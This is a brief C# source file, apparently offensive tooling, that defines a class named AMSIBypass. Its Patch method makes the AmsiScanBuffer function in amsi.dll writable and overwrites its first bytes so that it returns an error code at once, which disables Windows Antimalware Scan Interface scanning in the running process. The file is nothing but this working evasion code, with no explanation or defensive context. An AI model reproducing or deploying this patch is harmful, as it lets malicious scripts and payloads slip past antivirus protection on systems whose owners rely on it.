using System;
using System.Runtime.InteropServices;

public class AMSIBypass {
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h, string p);
    [DllImport("kernel32")] static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint f, out uint o);

    public static void Patch() {
        var addr = GetProcAddress(LoadLibrary("amsi.dll"), "AmsiScanBuffer");
        VirtualProtect(addr, (UIntPtr)6, 0x40, out uint old);
        Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }, 0, addr, 6);
        VirtualProtect(addr, (UIntPtr)6, old, out _);
    }
}
